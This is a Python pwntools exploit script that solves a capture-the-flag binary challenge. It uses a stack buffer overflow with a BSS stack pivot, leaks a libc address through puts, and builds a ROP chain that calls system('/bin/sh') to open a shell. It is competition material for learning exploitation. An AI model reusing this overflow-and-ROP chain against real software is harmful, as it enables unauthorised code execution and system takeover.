#!/usr/bin/env python3

# solve by enzocut

from pwn import *
from ctypes import CDLL
import time
import subprocess

enc = lambda a: a.encode() if isinstance(a, str) else a
sla = lambda a, b: r.sendlineafter(enc(a), enc(b))
snl = lambda a: r.sendline(enc(a))
sna = lambda a, b: r.sendafter(enc(a), enc(b))
snd = lambda a: r.send(enc(a))
rcu = lambda a: r.recvuntil(enc(a), drop=True)
rcv = lambda a: r.recv(enc(a))
rcl = lambda: r.recvline()
p24 = lambda a: p32(a)[:-1]
l64 = lambda a: u64(a.ljust(8, b"\x00"))
l32 = lambda a: u64(a.ljust(4, b"\x00"))
l16 = lambda a: u64(a.ljust(2, b"\x00"))
lin = lambda a: log.info(f"{hex(a)=}")
sen = lambda a: str(a).encode()
mangle = lambda ptr, pos: ptr ^ (pos >> 12)

exe = ELF("./chall")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

LIBC_ENV={"LD_PRELOAD": libc.path}

# Configuration settings for the script to launch GDB in the container
TERMINAL_CONFIG = ['tmux', 'split-window', '-h', '-F', '#{pane_pid}', '-P']

context.binary = exe
context.terminal = TERMINAL_CONFIG

serv = "chall.lac.tf"
port = 31137

def conn():
    # cmd = [exe.path]
    # r = remote(serv, port)
    r = process([ld.path, exe.path], env=LIBC_ENV)
    return r

r = conn()
input("Press enter to continue...")
def main():
    context.log_level = 'debug'  # Enables printing of all traffic
    bss = 0x404e00
    rbp = bss

    r.sendlineafter(b"2.", b"1")
    # First payload calls 0x40123C, which is "puts("Enter World Name: ")"
    r.sendlineafter(b":", b"A"*0x40 + p64(rbp) + p64(0x40123c))
    r.sendlineafter(b"2.", b"1")
    # Call 'exit' to return, which calls first payload
    r.sendlineafter(b"creeper", b"2")

    # Send second payload
    r.sendlineafter(b"name:", 
                    b"A"*0x40 + # Padding
                    p64(rbp+0x20) + # BSS + 0x20?
                    p64(0x4011b7) +             #  mov eax, dword ptr [rbp - 4] ; leave ; ret
                    p64(0) +                    # 0
                    p64(0x40400000000000) +     
                    p64(bss+0x30-8) + 
                    p64(0x401367) +             # Back into main function, just before puts and then readint
                    p64(exe.sym._start)
                    )
    r.sendlineafter(b"mode", b"1")
    r.sendlineafter(b"creeper", b"2")

    r.recvuntil(b"Exit", drop=True)
    r.recvline()
    libc.address = u64(r.recvline().strip().ljust(8, b"\x00")) - libc.sym.puts
    log.info(f"{hex(libc.address)=}")
    sleep(1)
    r.sendline(b"2")
    r.sendlineafter(b"Multi", b"1")

    rop1 = ROP(libc)
    rop1.raw(rop1.find_gadget(["ret"]))
    rop1.system(next(libc.search(b"/bin/sh\x00")))
    print(rop1.chain())
    r.sendlineafter(b"name:", b"A"*0x48 + rop1.chain())
    r.sendlineafter(b"mode", b"1")
    r.sendlineafter(b"creeper", b"2")

    r.interactive()

if __name__ == "__main__":
    main()
